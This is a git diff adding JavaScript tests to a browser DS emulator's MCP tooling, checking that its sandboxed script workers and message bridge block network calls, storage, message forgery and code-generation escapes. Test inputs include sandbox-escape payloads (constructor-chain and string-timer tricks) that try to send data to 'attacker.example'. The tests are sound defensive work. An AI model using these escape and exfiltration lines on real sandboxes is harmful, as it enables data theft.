@@ -24,6 +24,9 @@ import { withInternalMetadata } from "../src/internal-command-metadata.js";
 import { containsDynamicImport } from "../src/script-source-policy.js";
 import { createScriptRunner } from "../src/script-runner.js";
 import { createScreenInvalidNotice, SCREEN_INVALID_NOTICE } from "../src/screen-invalid-notice.js";
+import { createScriptCommands } from "../src/commands/script-commands.js";
+import { createContextCommands } from "../src/commands/context-commands.js";
+import { createAlgorithmLoader } from "../src/algorithm-loader.js";
 
 const responder = createMcpResponder({ logger: {} });
 const FRAMEBUFFER_BYTES = 256 * 384 * 4;
@@ -41,11 +44,20 @@ async function runEvalSandbox(code) {
     const messages = [];
     const listeners = new Map();
     let networkCalls = 0;
+    let storageCalls = 0;
     const context = vm.createContext({
         console,
         crypto: { randomUUID: () => "sandbox-token" },
         postMessage: (message) => messages.push(message),
         addEventListener: (type, listener) => listeners.set(type, listener),
+        setTimeout: (handler) => {
+            if (typeof handler === "string") networkCalls++;
+            else handler();
+        },
+        setInterval: (handler) => {
+            if (typeof handler === "string") networkCalls++;
+            else handler();
+        },
         fetch: () => { networkCalls++; return Promise.resolve({ ok: true }); },
         XMLHttpRequest: function XMLHttpRequest() { networkCalls++; },
         WebSocket: function WebSocket() { networkCalls++; },
@@ -53,14 +65,80 @@ async function runEvalSandbox(code) {
         Worker: function Worker() { networkCalls++; },
         SharedWorker: function SharedWorker() { networkCalls++; },
         importScripts: () => { networkCalls++; },
+        close: () => { networkCalls++; },
         BroadcastChannel: function BroadcastChannel() { networkCalls++; },
         WebTransport: function WebTransport() { networkCalls++; },
         indexedDB: {},
-        caches: {}
+        caches: {},
+        localStorage: {
+            getItem: () => { storageCalls++; },
+            setItem: () => { storageCalls++; }
+        },
+        sessionStorage: {
+            getItem: () => { storageCalls++; },
+            setItem: () => { storageCalls++; }
+        }
     });
+    context.self = context;
     vm.runInContext(source, context, { filename: "eval.worker.js" });
     await listeners.get("message")({ data: { type: "run", code, shortcuts: [] } });
-    return { messages, networkCalls };
+    return { messages, networkCalls, storageCalls };
+}
+
+async function runAlgorithmSandbox(librarySource) {
+    const source = await readFile(new URL("../src/workers/algorithm.worker.js", import.meta.url), "utf8");
+    const messages = [];
+    let networkCalls = 0;
+    let storageCalls = 0;
+    const networkCapability = () => { networkCalls++; };
+    const context = vm.createContext({
+        console,
+        postMessage: (message) => messages.push(message),
+        setTimeout: (handler) => {
+            if (typeof handler === "string") networkCalls++;
+            else handler();
+        },
+        setInterval: (handler) => {
+            if (typeof handler === "string") networkCalls++;
+            else handler();
+        },
+        fetch: networkCapability,
+        XMLHttpRequest: function XMLHttpRequest() { networkCalls++; },
+        WebSocket: function WebSocket() { networkCalls++; },
+        EventSource: function EventSource() { networkCalls++; },
+        Worker: function Worker() { networkCalls++; },
+        SharedWorker: function SharedWorker() { networkCalls++; },
+        importScripts: networkCapability,
+        close: networkCapability,
+        BroadcastChannel: function BroadcastChannel() { networkCalls++; },
+        WebTransport: function WebTransport() { networkCalls++; },
+        indexedDB: {},
+        caches: {},
+        localStorage: {
+            getItem: () => { storageCalls++; },
+            setItem: () => { storageCalls++; }
+        },
+        sessionStorage: {
+            getItem: () => { storageCalls++; },
+            setItem: () => { storageCalls++; }
+        },
+        navigator: {},
+        onmessage: null
+    });
+    context.self = context;
+    vm.runInContext(source, context, { filename: "algorithm.worker.js" });
+    context.onmessage({
+        data: {
+            type: "compare",
+            width: 1,
+            screen: "top",
+            region: [0, 0, 1, 1],
+            baseline: new Uint32Array([0]),
+            current: new Uint32Array([0]),
+            librarySource
+        }
+    });
+    return { messages, networkCalls, storageCalls };
 }
 
 test("input sequence restores pause without cancelling its own operation", async () => {
@@ -144,6 +222,206 @@ test("window.memory scalar aliases return numbers while DesmumeMCP.call stays st
         assert.equal(String(await window.memory.reg("r14", "arm9")).includes("[object Object]"), false);
         assert.deepEqual(await window.DesmumeMCP.call("memoryGetRegister", {}), { ok: true, value: 0x02075628 });
         assert.deepEqual(calls, ["memoryGetRegister", "memoryReadDword", "memoryGetRegister", "memoryGetRegister"]);
+    } finally {
+        for (const name of ["window", "navigator", "document"]) {
+            if (previous[name]) Object.defineProperty(globalThis, name, previous[name]);
+            else delete globalThis[name];
+        }
+    }
+});
+
+test("WebMCP relies on the native browser API without a global third-party script", async () => {
+    const html = await readFile(new URL("../public/index.html", import.meta.url), "utf8");
+    const api = await readFile(new URL("../webassembly/API.md", import.meta.url), "utf8");
+    assert.doesNotMatch(html, /@mcp-b\/global|__webModelContextOptions/);
+    assert.match(html, /WebMCPはブラウザ内蔵APIだけを使用し、外部CDNコードをグローバル空間へ読み込みません/);
+    const scriptSources = [...html.matchAll(/<script\b[^>]*\bsrc=(["'])(.*?)\1/gi)]
+        .map((match) => match[2]);
+    assert.deepEqual(scriptSources, ["coi-serviceworker.js", "app.js?v=20260722-releaseblocker3"]);
+    assert.equal(scriptSources.some((source) => /^(?:https?:)?\/\//i.test(source)), false);
+    const policy = html.match(/Content-Security-Policy" content="([^"]+)/)?.[1] || "";
+    const scriptDirective = policy.split(";").find((directive) => directive.trim().startsWith("script-src"));
+    const connectDirective = policy.split(";").find((directive) => directive.trim().startsWith("connect-src"));
+    assert.ok(scriptDirective);
+    assert.doesNotMatch(scriptDirective, /https?:/);
+    assert.match(connectDirective || "", /\bdata:/);
+    assert.match(api, /## Local security context/);
+    assert.match(api, /event\.origin === window\.location\.origin/);
+    assert.match(api, /localStorage.*sessionStorage/);
+    assert.match(api, /SHA-256/);
+});
+
+test("WebMCP prefers document.modelContext and accepts duplicate native registrations after reload", async () => {
+    const previous = Object.fromEntries(["window", "navigator", "document"].map((name) => [
+        name,
+        Object.getOwnPropertyDescriptor(globalThis, name)
+    ]));
+    let documentRegistrations = 0;
+    let navigatorRegistrations = 0;
+    const registeredDescriptions = [];
+    const logs = [];
+    Object.defineProperty(globalThis, "window", {
+        value: { addEventListener: () => {}, location: { origin: "http://localhost:8766" } },
+        configurable: true,
+        writable: true
+    });
+    Object.defineProperty(globalThis, "document", {
+        value: {
+            modelContext: {
+                registerTool: async (tool) => {
+                    documentRegistrations++;
+                    registeredDescriptions.push(tool.description);
+                    throw new Error("duplicate tool registration");
+                }
+            }
+        },
+        configurable: true,
+        writable: true
+    });
+    Object.defineProperty(globalThis, "navigator", {
+        value: {
+            modelContext: {
+                registerTool: async () => { navigatorRegistrations++; }
+            }
+        },
+        configurable: true,
+        writable: true
+    });
+    try {
+        const registration = registerWebMcp({
+            commands: { eval: async () => responder.ok(), runScript: async () => responder.ok() },
+            descriptions: {}, responder, runCommand: async () => responder.ok(), compact: String,
+            installShortcuts: () => {}, logger: (message) => logs.push(String(message))
+        });
+        assert.equal(await registration.registerBrowserTools(), true);
+        await new Promise((resolve) => setImmediate(resolve));
+        assert.ok(documentRegistrations >= 4);
+        assert.equal(navigatorRegistrations, 0);
+        assert.ok(logs.some((message) => message === "WebMCP registered 4 tools"));
+        const injectedContext = registeredDescriptions.join("\n");
+        assert.match(injectedContext, /ROM, save, and state bytes are not uploaded/);
+        assert.match(injectedContext, /cross-origin and opaque-origin message calls are ignored/);
+        assert.match(injectedContext, /localStorage, sessionStorage, IndexedDB, Cache API/);
+        assert.match(injectedContext, /exact-version SHA-256 verified/);
+    } finally {
+        for (const name of ["window", "navigator", "document"]) {
+            if (previous[name]) Object.defineProperty(globalThis, name, previous[name]);
+            else delete globalThis[name];
+        }
+    }
+});
+
+test("external comparison code is hash-pinned before it reaches the sandbox", async () => {
+    const requests = [];
+    const loader = createAlgorithmLoader({
+        responder,
+        fetchImpl: async (url, options) => {
+            requests.push({ url, options });
+            return { ok: true, arrayBuffer: async () => new Uint8Array([1, 2, 3]).buffer };
+        },
+        cryptoImpl: { subtle: { digest: async () => new Uint8Array(32).buffer } }
+    });
+    const result = await loader.load("ssim-trim");
+    assert.equal(result.ok, false);
+    assert.equal(result.error.code, "ALGORITHM_INTEGRITY_FAILED");
+    assert.equal(requests.length, 1);
+    assert.match(requests[0].url, /^https:\/\/cdn\.jsdelivr\.net\/npm\/ssim\.js@3\.5\.0\//);
+    assert.equal(requests[0].options.credentials, "omit");
+    assert.equal(requests[0].options.referrerPolicy, "no-referrer");
+});
+
+test("external comparison sandbox blocks network, message forgery, storage, and code-generation escape", async () => {
+    const result = await runAlgorithmSandbox(`
+        for (const name of [
+            "fetch", "XMLHttpRequest", "WebSocket", "EventSource", "Worker", "SharedWorker", "importScripts",
+            "BroadcastChannel", "WebTransport", "indexedDB", "caches", "localStorage", "sessionStorage",
+            "close", "navigator"
+        ]) {
+            try {
+                const capability = globalThis[name];
+                if (typeof capability === "function") capability("https://attacker.example/leak");
+            } catch {}
+        }
+        try { globalThis.postMessage({ type: "done", result: { pct: 100, debug: { forged: true } } }); } catch {}
+        try { setTimeout('fetch("https://attacker.example/timer")', 0); } catch {}
+        try { ({}).constructor.constructor('fetch("https://attacker.example/constructor")')(); } catch {}
+        globalThis.ssim = { ssim: () => ({ mssim: 1 }) };
+    `);
+    assert.equal(result.networkCalls, 0);
+    assert.equal(result.storageCalls, 0);
+    assert.deepEqual(result.messages.map((message) => message.type), ["ready", "done"]);
+    assert.equal(result.messages[1].result.pct, 0);
+    assert.equal(result.messages[1].result.debug.forged, undefined);
+});
+
+test("opaque and cross-origin contexts cannot use the message bridge to dump arbitrary ROM data", async () => {
+    const previous = Object.fromEntries(["window", "navigator", "document"].map((name) => [
+        name,
+        Object.getOwnPropertyDescriptor(globalThis, name)
+    ]));
+    const listeners = new Map();
+    Object.defineProperty(globalThis, "window", {
+        value: {
+            addEventListener: (type, listener) => listeners.set(type, listener),
+            location: { origin: "http://localhost:8766" }
+        },
+        configurable: true,
+        writable: true
+    });
+    Object.defineProperty(globalThis, "navigator", { value: {}, configurable: true, writable: true });
+    Object.defineProperty(globalThis, "document", { value: {}, configurable: true, writable: true });
+    try {
+        const fakeRom = new Uint8Array([0x44, 0x53, 0x52, 0x4f, 0x4d]);
+        let commandCalls = 0;
+        registerWebMcp({
+            commands: {}, descriptions: {}, responder,
+            runCommand: async () => {
+                commandCalls++;
+                return responder.ok({ size: fakeRom.length, marker: fakeRom[0] });
+            },
+            compact: String,
+            installShortcuts: () => {},
+            logger: () => {}
+        });
+        const messageHandler = listeners.get("message");
+        assert.equal(typeof messageHandler, "function");
+
+        const hostileCommands = [
+            "dumpMemory", "memoryReadByte", "memoryReadWord", "memoryReadDword", "getRegisters"
+        ];
+        for (const origin of ["null", "https://attacker.example"]) {
+            for (const command of hostileCommands) {
+                const replies = [];
+                await messageHandler({
+                    origin,
+                    data: {
+                        type: "desmume-mcp",
+                        id: `hostile-${origin}-${command}`,
+                        command,
+                        params: { address: 0, length: fakeRom.length }
+                    },
+                    source: { postMessage: (...args) => replies.push(args) }
+                });
+                assert.deepEqual(replies, [], `${origin}:${command}`);
+            }
+        }
+        assert.equal(commandCalls, 0);
+
+        const trustedReplies = [];
+        await messageHandler({
+            origin: window.location.origin,
+            data: {
+                type: "desmume-mcp",
+                id: "trusted",
+                command: "dumpMemory",
+                params: { address: 0, length: fakeRom.length }
+            },
+            source: { postMessage: (...args) => trustedReplies.push(args) }
+        });
+        assert.equal(commandCalls, 1);
+        assert.equal(trustedReplies.length, 1);
+        assert.equal(trustedReplies[0][0].result.marker, fakeRom[0]);
+        assert.equal(trustedReplies[0][1], window.location.origin);
     } finally {
         for (const name of ["window", "navigator", "document"]) {
             if (previous[name]) Object.defineProperty(globalThis, name, previous[name]);
@@ -279,6 +557,81 @@ test("first manual frame after State load becomes valid before canvas draw", asy
     assert.equal(state.completedFrameSerial, 1);
 });
 
+function createFailingFrameStep(stage, cleanupPauseFails = false) {
+    const pauseCalls = [];
+    let freezeCalls = 0;
+    const state = {
+        frame: 0, running: false, paused: true, ready: true, render: true,
+        touch: { active: stage === "native.runFrame" }, keys: 0, nativeFault: false,
+        screenValid: false, framesSinceStateLoad: 0, completedFrameSerial: 0,
+        selectedCpu: "arm9"
+    };
+    const fail = (name) => {
+        if (stage === name) throw new Error(`failed at ${name}`);
+    };
+    const commands = createRuntimeCommands({
+        applyFreezes: () => {
+            freezeCalls++;
+            if (stage === "applyFreezes" && freezeCalls === 2) fail("applyFreezes");
+        },
+        dispatchScriptEvent: () => fail("dispatchScriptEvent"),
+        drawFrame: () => fail("drawFrame"),
+        ensureRomLoaded: () => {},
+        frameService: { onFrameCompleted: () => fail("completeFrames") },
+        native: {
+            pause: (paused) => {
+                pauseCalls.push(paused);
+                if (paused && cleanupPauseFails) throw new Error("cleanup pause failed");
+            },
+            runFrame: () => {
+                fail("native.runFrame");
+                state.frame++;
+                return 0;
+            },
+            runFrames: () => {
+                fail("native.runFrames");
+                state.frame++;
+                return 1;
+            }
+        },
+        pumpAudio: () => fail("pumpAudio"),
+        state,
+        syncNativeBreakStatus: () => {
+            fail("syncNativeBreakStatus");
+            return { lastBreak: { hit: false } };
+        },
+        updateStatus: () => {}
+    });
+    return { commands, pauseCalls, state };
+}
+
+test("stepFrames restores native and logical pause state after every failing stage", async () => {
+    for (const stage of [
+        "native.runFrame", "native.runFrames", "syncNativeBreakStatus", "completeFrames",
+        "applyFreezes", "drawFrame", "pumpAudio", "dispatchScriptEvent"
+    ]) {
+        const harness = createFailingFrameStep(stage);
+        await assert.rejects(
+            harness.commands.stepFrames({ frames: 1 }),
+            new RegExp(`failed at ${stage.replace(".", "\\.")}`)
+        );
+        assert.deepEqual(harness.pauseCalls, [false, true], stage);
+        assert.equal(harness.state.paused, true, stage);
+        assert.equal(harness.state.running, false, stage);
+    }
+});
+
+test("stepFrames preserves its primary error when native pause cleanup also fails", async () => {
+    const harness = createFailingFrameStep("drawFrame", true);
+    await assert.rejects(
+        harness.commands.stepFrames({ frames: 1 }),
+        /failed at drawFrame/
+    );
+    assert.deepEqual(harness.pauseCalls, [false, true]);
+    assert.equal(harness.state.paused, true);
+    assert.equal(harness.state.running, false);
+});
+
 test("predictable State and Save native failures carry NATIVE_ERROR details", async () => {
     const stateHarness = createStateCommandHarness({ running: false, paused: true }, 7);
     await assert.rejects(
@@ -296,6 +649,92 @@ test("predictable State and Save native failures carry NATIVE_ERROR details", as
     await assert.rejects(
         save.exportSaveFile(),
         (error) => error.mcpCode === "NATIVE_ERROR" && error.mcpDetails.size === 0
+    );
+});
+
+test("Batch uses the dispatcher plain-object contract and rejects malformed items predictably", async () => {
+    const calls = [];
+    const scriptCommands = createScriptCommands({
+        state: { scripts: new Map() },
+        ui: {},
+        runCommand: async (command, params) => {
+            calls.push({ command, params });
+            return responder.ok({ command });
+        }
+    });
+    const registry = createCommandRegistry({ responder });
+    registry.registerAll(scriptCommands);
+    const dispatcher = createCommandDispatcher({
+        state: { ready: false }, registry, responder,
+        operationManager: { current: () => null },
+        hasLoadedRom: () => false,
+        emulatorActivity: () => ({}),
+        updateStatus: () => {}
+    });
+    const result = await dispatcher.run("batch", {
+        commands: [{ command: "status", params: {} }]
+    });
+    assert.equal(result.ok, true);
+    assert.deepEqual(calls, [{ command: "status", params: {} }]);
+    assert.equal((await dispatcher.run("batch", [{ command: "status" }])).error.code, "INVALID_ARGUMENT");
+    assert.equal((await dispatcher.run("batch", { commands: [null] })).error.code, "INVALID_ARGUMENT");
+    assert.equal((await dispatcher.run("batch", { commands: [{}] })).error.code, "INVALID_ARGUMENT");
+
+    const uiSource = await readFile(new URL("../src/ui/ui-controller.js", import.meta.url), "utf8");
+    assert.match(uiSource, /runCommand\("batch", \{\s*commands:/);
+});
+
+test("reserved State storage and analysis baseline failures use stable error codes", async () => {
+    const reserved = createStateCommands({
+        analysisBaselineSlotToken: Symbol("baseline"),
+        ensureRomLoaded: () => {},
+        isAnalysisBaselineSlot: () => true,
+        native: { saveStateBytes: () => ({ length: 1 }) }
+    });
+    await assert.rejects(
+        reserved.saveState({ slot: "analysis:reserved" }),
+        (error) => error.mcpCode === "INVALID_ARGUMENT"
+    );
+
+    const oversized = createStateCommands({
+        analysisBaselineSlotToken: Symbol("baseline"),
+        ensureRomLoaded: () => {},
+        isAnalysisBaselineSlot: () => false,
+        rememberSlot: () => {},
+        native: { saveStateBytes: () => ({ length: 256 * 1024 * 1024 + 1 }) }
+    });
+    await assert.rejects(
+        oversized.saveState({ slot: "too-large" }),
+        (error) => error.mcpCode === "INVALID_ARGUMENT"
+    );
+
+    const baseline = {
+        romName: "game.nds", romSize: 10, romSha256: "rom-hash", stateFormatVersion: 12,
+        slot: "analysis:baseline", stateSize: 4, stateSha256: "state-hash"
+    };
+    const createContext = ({ storedBaseline = baseline, rom = baseline, stateBytes = new Uint8Array(4), stateHash = "state-hash" } = {}) => (
+        createContextCommands({
+            ANALYSIS_BASELINE_SLOT_PREFIX: "analysis:",
+            analysisBaselineSlotToken: Symbol("baseline"),
+            ensureRomLoaded: () => {},
+            readAnalysisBaseline: () => storedBaseline,
+            currentRomIdentity: async () => rom,
+            idbGet: async () => stateBytes,
+            sha256Hex: async () => stateHash,
+            state: {}, ui: {}
+        })
+    );
+    await assert.rejects(
+        createContext({ storedBaseline: null }).restoreAnalysisBaseline({ name: "missing" }),
+        (error) => error.mcpCode === "STATE_NOT_LOADED"
+    );
+    await assert.rejects(
+        createContext({ rom: { ...baseline, romSha256: "different" } }).restoreAnalysisBaseline(),
+        (error) => error.mcpCode === "STATE_INVALID" && error.mcpDetails.field === "romSha256"
+    );
+    await assert.rejects(
+        createContext({ stateHash: "different" }).restoreAnalysisBaseline(),
+        (error) => error.mcpCode === "STATE_INVALID"
     );
 });
 
@@ -422,6 +861,36 @@ test("NaN command inputs are rejected before mutable emulator state is touched",
     assert.equal(debuggerHarness.pc(), 0x02000000);
 });
 
+test("input hold, tap, and touch waits enforce per-value and aggregate limits", async () => {
+    const inputEvents = [];
+    const input = createInputCommands({
+        state: { keys: 0, touch: { active: false }, keymap: {} },
+        ensureRomLoaded: () => {},
+        renderHotkey: () => {},
+        saveKeymap: () => {},
+        setKey: (...args) => inputEvents.push(["key", ...args]),
+        setTouchState: (...args) => inputEvents.push(["touch", ...args]),
+        toButtonList: () => ["A"],
+        waitChecked: async () => {}
+    });
+    for (const call of [
+        () => input.runInputHold({ durationMs: 600001 }),
+        () => input.runInputHold({ durationMs: 600000, waitAfterMs: 1 }),
+        () => input.runInputTap({ repeat: 2, holdMs: 300001, gapMs: 0 }),
+        () => input.runInputTap({ repeat: 1, holdMs: 600001 }),
+        () => input.runTouchHold({ x: 1, y: 1, durationMs: 600001 }),
+        () => input.runTouchHold({ x: 1, y: 1, durationMs: 600000, waitBeforeMs: 1 })
+    ]) {
+        await assert.rejects(call(), (error) => error.mcpCode === "INVALID_ARGUMENT");
+    }
+    assert.deepEqual(inputEvents, []);
+    await input.runInputTap({ repeat: 2, holdMs: 100, gapMs: 50, waitBeforeMs: 10, waitAfterMs: 10 });
+    assert.deepEqual(inputEvents, [
+        ["key", "A", true], ["key", "A", false],
+        ["key", "A", true], ["key", "A", false]
+    ]);
+});
+
 test("invalid framebuffer and collapsed shell diagnostics preserve the last canvas", () => {
     let canvasWrites = 0;
     const logs = [];
@@ -429,17 +898,20 @@ test("invalid framebuffer and collapsed shell diagnostics preserve the last canv
         ready: true, render: true, scale: 2, rotation: 0,
         imageData: { data: new Uint8ClampedArray(FRAMEBUFFER_BYTES) }
     };
+    let connected = false;
+    let rect = { width: 0, height: Number.NaN };
+    let frameBytes = new Uint8Array(12);
     const loop = createEmulationLoop({
         state,
         ui: {
             screen: {
-                isConnected: false,
+                get isConnected() { return connected; },
                 getContext: () => ({ putImageData: () => { canvasWrites++; } })
             },
-            screenShell: { getBoundingClientRect: () => ({ width: 0, height: Number.NaN }) }
+            screenShell: { getBoundingClientRect: () => rect }
         },
         frameService: { isValid: () => true },
-        native: { getFrameBytes: () => new Uint8Array(12) },
+        native: { getFrameBytes: () => frameBytes },
         handleNativeFault: () => {},
         syncNativeBreakStatus: () => ({}),
         dispatchScriptEvent: () => {},
@@ -447,9 +919,24 @@ test("invalid framebuffer and collapsed shell diagnostics preserve the last canv
         log: (message) => logs.push(message)
     });
     assert.throws(() => loop.drawFrame(), /invalid framebuffer length/);
+    assert.throws(() => loop.drawFrame(), /invalid framebuffer length/);
     assert.equal(canvasWrites, 0);
-    assert.ok(logs.some((message) => message.includes("canvas detached")));
-    assert.ok(logs.some((message) => message.includes("shell collapsed")));
+    assert.equal(logs.filter((message) => message.includes("invalid framebuffer")).length, 1);
+
+    frameBytes = new Uint8Array(FRAMEBUFFER_BYTES);
+    loop.drawFrame();
+    loop.drawFrame();
+    assert.equal(logs.filter((message) => message.includes("canvas detached")).length, 1);
+
+    connected = true;
+    loop.drawFrame();
+    loop.drawFrame();
+    assert.equal(logs.filter((message) => message.includes("shell collapsed")).length, 1);
+
+    rect = { width: 512, height: 768 };
+    loop.drawFrame();
+    assert.equal(logs.filter((message) => message.includes("recovered")).length, 1);
+    assert.equal(canvasWrites, 5);
 });
 
 test("dispatcher owns one debugger refresh per command cycle", async () => {
@@ -669,6 +1156,9 @@ test("eval command rejects dynamic import bypass before any Worker starts", asyn
 });
 
 test("eval sandbox blocks network, DOM, Window, sub-Workers, and constructor-chain escape", async () => {
+    const harmless = await runEvalSandbox('return "import("');
+    assert.equal(harmless.messages.find((message) => message.type === "done")?.result, "import(");
+
     const capabilities = await runEvalSandbox(`
         return {
             window: typeof window,
@@ -679,7 +1169,13 @@ test("eval sandbox blocks network, DOM, Window, sub-Workers, and constructor-cha
             socket: typeof WebSocket,
             worker: typeof Worker,
             post: typeof postMessage,
-            constructorFetch: typeof (({}).constructor.constructor("return fetch")())
+            eval: typeof eval,
+            localStorage: typeof localStorage,
+            sessionStorage: typeof sessionStorage,
+            objectConstructor: typeof ({}).constructor,
+            functionConstructor: typeof (() => {}).constructor,
+            close: typeof close,
+            selfClose: typeof self.close
         };
     `);
     const done = capabilities.messages.find((message) => message.type === "done");
@@ -692,38 +1188,101 @@ test("eval sandbox blocks network, DOM, Window, sub-Workers, and constructor-cha
         socket: "undefined",
         worker: "undefined",
         post: "undefined",
-        constructorFetch: "undefined"
+        eval: "undefined",
+        localStorage: "undefined",
+        sessionStorage: "undefined",
+        objectConstructor: "undefined",
+        functionConstructor: "undefined",
+        close: "undefined",
+        selfClose: "undefined"
     });
     assert.equal(capabilities.networkCalls, 0);
+    assert.equal(capabilities.storageCalls, 0);
+
+    const storage = await runEvalSandbox(`
+        try { localStorage.setItem("rom", "leak"); } catch {}
+        try { sessionStorage.getItem("rom"); } catch {}
+        return "blocked";
+    `);
+    assert.equal(storage.messages.find((message) => message.type === "done")?.result, "blocked");
+    assert.equal(storage.storageCalls, 0);
 
     const external = await runEvalSandbox('return await fetch("https://example.com/")');
     assert.equal(external.networkCalls, 0);
     assert.ok(external.messages.some((message) => message.type === "error"));
+
+    const indirectEval = await runEvalSandbox('(0, eval)(\'return import("/module.js")\')');
+    assert.equal(indirectEval.networkCalls, 0);
+    assert.ok(indirectEval.messages.some((message) => message.type === "error"));
+
+    const constructorImport = await runEvalSandbox('({}).constructor.constructor(\'return import("/module.js")\')()');
+    assert.equal(constructorImport.networkCalls, 0);
+    assert.ok(constructorImport.messages.some((message) => message.type === "error"));
+
+    const asyncConstructorImport = await runEvalSandbox('Object.getPrototypeOf(async function(){}).constructor(\'return import("/module.js")\')()');
+    assert.equal(asyncConstructorImport.networkCalls, 0);
+    assert.ok(asyncConstructorImport.messages.some((message) => message.type === "error"));
+
+    const stringTimerImport = await runEvalSandbox('setTimeout(\'import("/module.js")\', 0)');
+    assert.equal(stringTimerImport.networkCalls, 0);
+    assert.ok(stringTimerImport.messages.some((message) => message.type === "error"));
 
     const forged = await runEvalSandbox('postMessage({ type: "done", result: "forged" }); return "real"');
     assert.equal(forged.messages.some((message) => message.type === "done" && message.result === "forged"), false);
     assert.ok(forged.messages.some((message) => message.type === "error"));
 });
 
-async function runPersistentScalarSandbox() {
+async function runPersistentScalarSandbox(
+    code = 'const lr = await memory.reg("r14", "arm9"); const seed = await memory.read32(0x02385f0c, "arm9"); print(lr, seed);',
+    replies = [0x02075628, 0x12345678]
+) {
     const source = await readFile(new URL("../src/workers/persistent-script.worker.js", import.meta.url), "utf8");
     const messages = [];
     const listeners = new Map();
+    let networkCalls = 0;
+    let storageCalls = 0;
     const context = vm.createContext({
         console,
         crypto: { randomUUID: () => "persistent-token" },
         postMessage: (message) => messages.push(message),
-        addEventListener: (type, listener) => listeners.set(type, listener)
+        addEventListener: (type, listener) => listeners.set(type, listener),
+        setTimeout: (handler) => {
+            if (typeof handler === "string") networkCalls++;
+            else handler();
+        },
+        setInterval: (handler) => {
+            if (typeof handler === "string") networkCalls++;
+            else handler();
+        },
+        fetch: () => { networkCalls++; return Promise.resolve({ ok: true }); },
+        XMLHttpRequest: function XMLHttpRequest() { networkCalls++; },
+        WebSocket: function WebSocket() { networkCalls++; },
+        EventSource: function EventSource() { networkCalls++; },
+        Worker: function Worker() { networkCalls++; },
+        SharedWorker: function SharedWorker() { networkCalls++; },
+        importScripts: () => { networkCalls++; },
+        close: () => { networkCalls++; },
+        BroadcastChannel: function BroadcastChannel() { networkCalls++; },
+        WebTransport: function WebTransport() { networkCalls++; },
+        indexedDB: {},
+        caches: {},
+        localStorage: {
+            getItem: () => { storageCalls++; },
+            setItem: () => { storageCalls++; }
+        },
+        sessionStorage: {
+            getItem: () => { storageCalls++; },
+            setItem: () => { storageCalls++; }
+        }
     });
     vm.runInContext(source, context, { filename: "persistent-script.worker.js" });
     const start = listeners.get("message")({
         data: {
             type: "start",
-            code: 'const lr = await memory.reg("r14", "arm9"); const seed = await memory.read32(0x02385f0c, "arm9"); print(lr, seed);',
+            code,
             shortcuts: []
         }
     });
-    const replies = [0x02075628, 0x12345678];
     let handled = 0;
     for (let attempt = 0; handled < replies.length && attempt < 50; attempt++) {
         await new Promise((resolve) => setImmediate(resolve));
@@ -739,14 +1298,42 @@ async function runPersistentScalarSandbox() {
         throw new Error(`persistent scalar RPC stalled: ${messages.map((message) => message.type).join(",")}`);
     }
     await start;
-    return messages;
+    return { messages, networkCalls, storageCalls };
 }
 
+test("persistent sandbox accepts harmless dynamic-import text", async () => {
+    const { messages } = await runPersistentScalarSandbox('print("import(");', []);
+    assert.ok(messages.some((message) => message.type === "started"));
+    assert.ok(messages.some((message) => message.type === "print" && message.values[0] === "import("));
+    assert.equal(messages.some((message) => message.type === "failed"), false);
+});
+
 test("persistent-script legacy memory reads remain numeric", async () => {
-    const messages = await runPersistentScalarSandbox();
+    const { messages } = await runPersistentScalarSandbox();
     const printed = messages.find((message) => message.type === "print");
     assert.deepEqual(Array.from(printed.values), [0x02075628, 0x12345678]);
     assert.equal(String(printed.values[0]).includes("[object Object]"), false);
+});
+
+test("persistent sandbox blocks network, message forgery, storage, and code-generation escape", async () => {
+    const { messages, networkCalls, storageCalls } = await runPersistentScalarSandbox(`
+        try { await fetch("https://attacker.example/network"); } catch {}
+        try { globalThis.fetch("https://attacker.example/global"); } catch {}
+        try { new Worker("https://attacker.example/worker.js"); } catch {}
+        try { postMessage({ type: "forged" }); } catch {}
+        try { localStorage.setItem("rom", "leak"); } catch {}
+        try { sessionStorage.getItem("rom"); } catch {}
+        try { setTimeout('fetch("https://attacker.example/timer")', 0); } catch {}
+        try { ({}).constructor.constructor('fetch("https://attacker.example/constructor")')(); } catch {}
+        print(typeof fetch, typeof Worker, typeof postMessage, typeof localStorage, typeof sessionStorage);
+    `, []);
+    assert.equal(networkCalls, 0);
+    assert.equal(storageCalls, 0);
+    assert.equal(messages.some((message) => message.type === "forged"), false);
+    const printed = messages.find((message) => message.type === "print");
+    assert.deepEqual(Array.from(printed.values), [
+        "undefined", "undefined", "undefined", "undefined", "undefined"
+    ]);
 });
 
 test("Ctable script registers hooks, prints numeric seeds, and resumes after exec callback", async () => {
@@ -820,6 +1407,99 @@ test("Ctable script registers hooks, prints numeric seeds, and resumes after exe
     const callbackPrint = messages.filter((message) => message.type === "print").flatMap((message) => message.values.map(String));
     assert.ok(callbackPrint.some((value) => value.includes("lr 0x11111111")));
     assert.equal(callbackPrint.some((value) => value.includes("[object Object]")), false);
+});
+
+test("overlay script registers load/unload/tick hooks and reports overlay transitions", async () => {
+    const workerSource = await readFile(new URL("../src/workers/persistent-script.worker.js", import.meta.url), "utf8");
+    const overlaySource = await readFile(new URL("../scripts/dq9/overlay_jp.js", import.meta.url), "utf8");
+    const messages = [];
+    const listeners = new Map();
+    let buttonValue = 0;
+    const context = vm.createContext({
+        console,
+        crypto: { randomUUID: () => "overlay-token" },
+        postMessage: (message) => messages.push(message),
+        addEventListener: (type, listener) => listeners.set(type, listener)
+    });
+    vm.runInContext(workerSource, context, { filename: "persistent-script.worker.js" });
+
+    const resultFor = (request) => {
+        if (request.type === "register") return { id: request.trigger.callbackId };
+        if (request.command === "memoryReadByte") {
+            if (request.params.address === 0x04000130) return { ok: true, value: buttonValue };
+            const slot = request.params.address - 0x01ffd384;
+            return { ok: true, value: slot === 0 ? 2 : 0xff };
+        }
+        if (request.command === "memoryReadDword") {
+            if (request.params.address === 0x020e9034 + 2 * 8) return { ok: true, value: 0x03000000 };
+            if (request.params.address === 0x01ffd3b4 + 2 * 0x2c + 4) return { ok: true, value: 0x00000002 };
+        }
+        if (request.command === "memoryGetRegister") {
+            return { ok: true, value: request.params.register === "r0" ? 2 : 0x11111111 };
+        }
+        if (request.command === "resume") return { ok: true };
+        throw new Error(`unexpected overlay request: ${request.command || request.type}`);
+    };
+    let handled = 0;
+    const drainUntil = async (predicate, attempts = 500) => {
+        for (let attempt = 0; attempt < attempts; attempt++) {
+            const requests = messages.filter((message) => message.type === "register" || message.type === "call");
+            while (handled < requests.length) {
+                const request = requests[handled++];
+                await listeners.get("message")({
+                    data: { replyId: request.id, result: resultFor(request) }
+                });
+            }
